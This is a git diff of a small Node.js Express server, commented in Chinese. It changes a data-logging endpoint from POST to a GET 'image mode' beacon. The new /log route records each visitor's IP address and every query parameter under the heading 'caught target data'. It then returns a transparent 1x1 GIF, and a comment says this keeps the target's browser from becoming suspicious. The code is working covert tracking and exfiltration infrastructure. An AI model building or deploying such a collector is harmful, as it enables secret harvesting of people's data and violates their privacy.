@@ -1,24 +1,18 @@
 const express = require('express');
-const cors = require('cors');
 const app = express();
 
-app.use(cors());
-// 增加對多種格式的支援
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+app.get('/', (req, res) => res.send('探測器後端已就緒！'));
 
-// 增加一個測試頁面，確保後端真的活著
-app.get('/', (req, res) => {
-    res.send('探測器後端運作中！');
+// 使用「圖片模式」接收數據，這最穩定
+app.get('/log', (req, res) => {
+    console.log('--- [抓到目標數據] ---');
+    console.log('IP:', req.headers['x-forwarded-for'] || req.socket.remoteAddress);
+    console.log('詳情:', req.query);
+    
+    // 回傳一個透明小像素，讓對方瀏覽器不生疑
+    const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
+    res.writeHead(200, { 'Content-Type': 'image/gif', 'Content-Length': pixel.length });
+    res.end(pixel);
 });
 
-app.post('/log', (req, res) => {
-    console.log('--- [收到數據] ---');
-    console.log('來自 IP:', req.headers['x-forwarded-for'] || req.socket.remoteAddress);
-    console.log('設備內容:', JSON.stringify(req.body, null, 2));
-    res.sendStatus(200);
-});
-
-app.listen(process.env.PORT || 3000, () => {
-    console.log('Server is fully ready!');
-});
+app.listen(process.env.PORT || 3000);
